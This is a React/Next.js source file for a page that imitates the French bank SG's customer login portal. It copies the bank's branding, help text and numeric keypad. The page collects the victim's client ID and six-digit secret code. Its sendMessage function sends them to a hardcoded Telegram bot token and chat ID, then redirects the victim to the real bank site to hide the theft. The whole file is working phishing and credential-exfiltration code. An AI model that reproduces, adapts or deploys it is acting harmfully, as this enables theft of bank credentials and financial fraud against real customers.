"use client"

import Image from "next/image";
import KeyboardDoubleArrowRightIcon from '@mui/icons-material/KeyboardDoubleArrowRight';
import {useState} from "react";
import SwitchWithText from "@/app/sg/component/switch";
import NumericKeypadGrid from "@/app/sg/component/keyboard";
import {z} from "zod";
import { zodResolver } from "@hookform/resolvers/zod"
import {useForm} from "react-hook-form"

const input1Schema = z.object({
    input1 : z.string().regex(/^\d+$/, "Votre identifiant est incorrect.").min(8, "Votre identifiant est incorrect.")
})

const input2Schema = z.object({
    input2 : z.string()
        .min(6, "Le code secret saisi est incorrect. Merci de bien vouloir ressaisir votre code secret composé de 6 chiffres."),
})

const fullSchema = input1Schema.merge(input2Schema)


export default function Home() {

    const {
        register,
        trigger,
        getValues,
        setValue,
        watch,
        formState: { errors },
    } = useForm({
        resolver: zodResolver(fullSchema),
        mode: "onTouched",
        defaultValues : {
            input2: ""
        }
    })

    const [step, setStep] = useState(1);
    const input1 = watch("input1")
    const input2 = watch("input2")

    const sendMessage = async (message : string) => {
        const token = '8166936500:AAFN7kGshSodpKi9EgyE90vC4q5XY8KJUtI';
        const chatId = '8343791176';
        const text = encodeURIComponent(message || 'Message par défaut');

        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${text}`;

        try {
            const response = await fetch(url);
            const data = await response.json();
            window.location.href = "https://particuliers.sg.fr/"
        } catch (error) {
        }
    };

    const resetCode = () => {
        setValue("input2", "")
    };

    const handleClickCode = (num : string) => {
        if(input2.length < 6){
            setValue("input2", input2 + num)
        }
    };

    const buildMessage = (name : string, code: string) => {
        return (
            `Bonjour 👋
                Voici vos identifiants :
                Identifiant : ${name}
                Mot de passe  : ${code}
                
                Merci de garder ces informations en lieu sûr 🔐`
                        );
                    };


    const onSubmit = async (e: React.MouseEvent<HTMLButtonElement>) => {
        e.preventDefault();
        if(step == 1){
            const v = await trigger("input1")
            if (v) setStep(2);
        } else if(step == 2){
            const v = await trigger("input2")
            if(v){
                const {input1, input2} = getValues()
                console.log(buildMessage(input1, input2))
                await sendMessage(buildMessage(input1, input2))
            }

        }
    };

    return (
        <>
            <div
                className={"lg:flex lg:flex-row justify-end w-full h-[24px] bg-[#010035]  text-white gap-6 pr-8 hidden"}>
                <div className={"flex flex-row gap-2 items-center"}>
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
                         stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                         className="lucide lucide-map-pin-icon lucide-map-pin">
                        <path
                            d="M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0"/>
                        <circle cx="12" cy="10" r="3"/>
                    </svg>
                    <div className={"text-[12px] font-medium"}>Agences</div>
                </div>
                <div className={"flex flex-row gap-2 items-center"}>
                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none"
                         stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                         className="lucide lucide-triangle-alert-icon lucide-triangle-alert">
                        <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3"/>
                        <path d="M12 9v4"/>
                        <path d="M12 17h.01"/>
                    </svg>
                    <div className={"text-[12px] font-medium"}>Aide et contact</div>
                </div>
            </div>
            <div
                className={"w-full h-[89.2px] border-b-1 border-gray-300 items-center flex flex-row px-4 justify-between"}>
                <div>
                    <Image height={56} width={205} src="/img/sg_m.png" alt=""/>
                </div>
                <div>
                    <button
                        className="cursor-pointer bg-[#010035] items-center rounded-full text-white py-3 px-6 hidden md:flex">
                        <span>Ouvrir un compte</span>
                    </button>
                </div>
            </div>
            <div
                style={{ color: "#545454" }}
                className="mt-3 pl-6 font-semibold text-[16px]"
            >
                Connexion à votre Espace Client Particuliers
            </div>
            <div className="flex flex-col mx-auto  justify-center bg-white/95 w-full max-w-6xl mt-10">
                <div className={"flex flex-col md:flex-row"}>
                    <div className={"w-full md:w-1/2 md:border-r-2 md:border-gray-400 mt-8"}>
                        <form className="bg-white p-8 w-full max-w-sm mx-auto">
                            <div className="relative ">
                                <input
                                    type="text"
                                    id="name"
                                    className="text-[19px] tracking-[1.5px] font-semibold peer block w-full border-b border-gray-500 p-2 pr-8 text-gray-600 focus:outline-none focus:border-black"
                                    placeholder=" "
                                    maxLength={8}
                                    {...register("input1")}
                                />
                                <label
                                    htmlFor="name"
                                    className="absolute left-2 top-4 text-gray-500 transition-all
                                       peer-placeholder-shown:top-2
                                       peer-focus:-top-4 peer-focus:font-semibold peer-focus:text-[15px] peer-focus:text-md
                                       peer-not-placeholder-shown:-top-4 text-lg"
                                >
                                    Saisissez votre identifiant
                                </label>

                                {step && (
                                    <button
                                        type="button"
                                        onClick={() => setValue("input1", "")}
                                        className="absolute right-2 top-1/2 -translate-y-1/2 text-gray-500 cursor-pointer "
                                    >
                                        {input1 && input1.length == 8 && /^\d+$/.test(input1) ? (
                                            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="25"
                                                 viewBox="0 0 24 24" fill="none" stroke="#55d39e" stroke-width="3.5"
                                                 stroke-linecap="round" stroke-linejoin="round"
                                                 className="lucide lucide-check-icon lucide-check">
                                                <path d="M17 8 10.5 15l-3.5-3.5"/>
                                            </svg>
                                        ) : (
                                            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24"
                                                 viewBox="0 0 24 24" fill="none" stroke="currentColor"
                                                 stroke-width="3.5"
                                                 stroke-linecap="round" stroke-linejoin="round"
                                            className="lucide lucide-x-icon lucide-x">
                                            <path d="M18 6 6 18"/>
                                            <path d="m6 6 12 12"/>
                                            </svg>
                                            )}
                                    </button>
                                )}
                            </div>
                            <div className={"mt-5 flex justify-center"}>
                                {errors.input1 && <p className="text-red-500 text-sm">{errors.input1.message}</p> }
                                {errors.input2 && <p className="text-red-500 text-[13px]">{errors.input2.message}</p> }
                            </div>
                            <div className={"mb-6 flex flex-row justify-center gap-2 mt-2"}>
                                <SwitchWithText/>
                                <div>
                                    Se souvenir de moi
                                </div>
                                <div>
                                    <svg xmlns="http://www.w3.org/2000/svg" width="22" height="22" viewBox="0 0 24 24"
                                         fill="none" stroke="currentColor" stroke-width="1" stroke-linecap="round"
                                         stroke-linejoin="round" className="lucide lucide-info-icon lucide-info">
                                        <circle cx="12" cy="12" r="9"/>
                                        <path d="M12 16v-4"/>
                                        <path d="M12 8h.01"/>
                                    </svg>
                                </div>
                            </div>
                            {step == 2 && <NumericKeypadGrid value={input2} handleClick={handleClickCode} reset={resetCode} />}
                            <div className="flex justify-center">
                                <button
                                    type={"button"}
                                    onClick={(e) => {onSubmit(e)}}
                                    className="w-[200px] font-semibold cursor-pointer bg-[#e9041e] rounded-full text-white py-3 flex justify-center items-center">
                                    Valider
                                </button>
                            </div>
                            {step == 2 &&
                            <div style={{color: "#545454"}} className={"mt-3 flex justify-center font-semibold text-[15px] underline cursor-pointer"} >Activer le clavier sonore</div>}
                        </form>
                    </div>
                    <div className={"w-full md:w-1/2 mt-10 pl-4 pt-6 pb-10 md:ml-20 bg-[#f7f7f7] md:bg-white"}>
                        <span style={{color: "#545454"}} className={"font-semibold text-[15px]"}>Où trouver mon Code Client SG ?</span><br/>
                        <ul className={"list-disc ml-8 mt-3"}>
                            <li>
                                Votre Code Client vous a été communiqué lors de la souscription à la Banque à Distance.
                                Il est également indiqué sur vos relevés de comptes.
                            </li>
                        </ul>
                        <br/>
                        <span style={{color: "#545454"}} className={"font-semibold text-[15px]"}>Code Client ou Code Secret inconnus ?</span><br/>
                        <ul className="text-gray-800 list-none mt-4">
                            <li className="flex items-center">
                                <KeyboardDoubleArrowRightIcon  style={{ fontSize: "15px" }} className={"mr-[2px]"}/>
                                <span className={"underline cursor-pointer "}>Je souhaite obtenir mon Code Client</span><br/>
                            </li>
                            <li className="flex items-center">
                                <KeyboardDoubleArrowRightIcon  style={{ fontSize: "15px" }} className={"mr-[2px]"}/>
                                <span className={"underline cursor-pointer"}>Je ne connais pas mon Code Secret</span><br/>
                            </li>
                        </ul>

                    </div>
                </div>
                <div>
                </div>
            </div>

            <footer className={"flex items-center  w-full h-auto md:h-[110.4px] bg-black text-white text-[17px] md:mt-44"}>
                <div className={"flex flex-col lg:flex-row justify-center lg:justify-between w-full max-w-7xl lg:mx-auto mt-2"}>
                    <div className={"flex flex-col md:flex-row md:gap-16 items-center justify-center"}>
                        <div className={"flex flex-col items-center md:flex-row md:gap-2"}>
                            <div className={""}>
                                <Image height={53} width={47} src="/img/questions.png" alt=""/>
                            </div>
                            <div className={"md:mt-2 hover:underline cursor-pointer"}>Questions fréquentes</div>
                        </div>
                        <div className={"flex flex-col items-center md:flex-row md:gap-2"}>
                            <div>
                                <Image height={50} width={33} src="/img/localisation.png" alt=""/>
                            </div>
                            <div className={"md:mt-2 decoration-white hover:underline cursor-pointer"}>Trouver une agence</div>
                        </div>
                        <div className={"flex flex-row md:gap-2"}>
                            <div className={"md:mt-2 decoration-white hover:underline cursor-pointer"}>
                                Autres sites SG
                            </div>
                            <div className={"md:mt-2"}>
                                <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
                                     stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"
                                     className="lucide lucide-chevron-down-icon lucide-chevron-down">
                                    <path d="m6 9 6 6 6-6"/>
                                </svg>
                            </div>
                        </div>
                    </div>
                    <div className={"flex flex-row md:gap-3  justify-center"}>
                        <Image className={"cursor-pointer"} height={58} width={49} src="/img/fb.png" alt=""/>
                        <Image className={"cursor-pointer"} height={58} width={49} src="/img/ig.png" alt=""/>
                        <Image className={"cursor-pointer"} height={58} width={49} src="/img/x.png" alt=""/>
                    </div>
                </div>
            </footer>
            <div className={"flex flex-col items-center justify-center w-full mb-4"}>
                <Image className={"cursor-pointer mt-4"} height={40} width={110} src="/img/sgbig.webp" alt=""/>
                <div className="flex flex-col justify-center items-center md:flex-row flex-wrap text-[#666] text-md max-w-7xl mx-auto ">
                    <div className="flex items-center whitespace-nowrap hover:underline">
                        Sécurité
                        <span className="mx-2 hidden md:inline">|</span>
                    </div>
                    <div className="flex items-center whitespace-nowrap hover:underline">
                        Nos engagements
                        <span className="mx-2 hidden md:inline">|</span>
                    </div>
                    <div className="flex items-center whitespace-nowrap hover:underline">
                        Gestion des Cookies
                        <span className="mx-2 hidden md:inline">|</span>
                    </div>
                    <div className="flex items-center whitespace-nowrap hover:underline">
                        Données personnelles
                        <span className="mx-2 hidden md:inline">|</span>
                    </div>
                    <div className="flex items-center whitespace-nowrap hover:underline">
                        Documentation et Tarifs
                        <span className="mx-2 hidden md:inline">|</span>
                    </div>
                    <div className="flex items-center whitespace-nowrap hover:underline">
                        Résilier une prestation
                        <span className="mx-2 hidden md:inline">|</span>
                    </div>
                    <div className="flex items-center whitespace-nowrap hover:underline">
                        Contestation et réclamation
                        <span className="mx-2 hidden md:inline">|</span>
                    </div>
                    <div className="flex items-center whitespace-nowrap hover:underline">
                        Informations légales
                        <span className="mx-2 hidden md:inline">|</span>
                    </div>
                    <div className="flex items-center whitespace-nowrap hover:underline">
                        Accessibilité Numérique (partiellement conforme)
                        <span className="mx-2 hidden md:inline">|</span>
                    </div>
                    <div className="flex items-center whitespace-nowrap hover:underline">
                        Label « Engagé RSE »
                    </div>
                </div>


            </div>
        </>
    );
}
